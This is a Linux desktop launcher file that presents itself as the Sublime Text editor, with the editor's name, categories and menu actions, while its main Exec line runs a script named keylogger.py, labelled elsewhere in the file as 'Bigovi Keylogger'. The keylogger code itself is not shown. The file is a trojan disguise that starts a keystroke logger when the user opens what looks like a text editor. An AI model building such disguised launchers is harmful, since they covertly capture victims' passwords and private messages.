[Desktop Entry]
Version=1.0
Type=Application
Name=Sublime Text
GenericName=keylogger
Terminal=false
MimeType=text/plain;
Icon=scroll-lock-on
Categories=TextEditor;Development;
StartupNotify=true
Actions=Window;Document;

Exec=./keylogger.py

Name[en_US.utf8]=Bigovi Keylogger

[Desktop Action Window]
Name=New Window
Exec=/opt/sublime_text/sublime_text -n
OnlyShowIn=Unity;

[Desktop Action Document]
Name=New File
Exec=/opt/sublime_text/sublime_text --command new_file
OnlyShowIn=Unity;
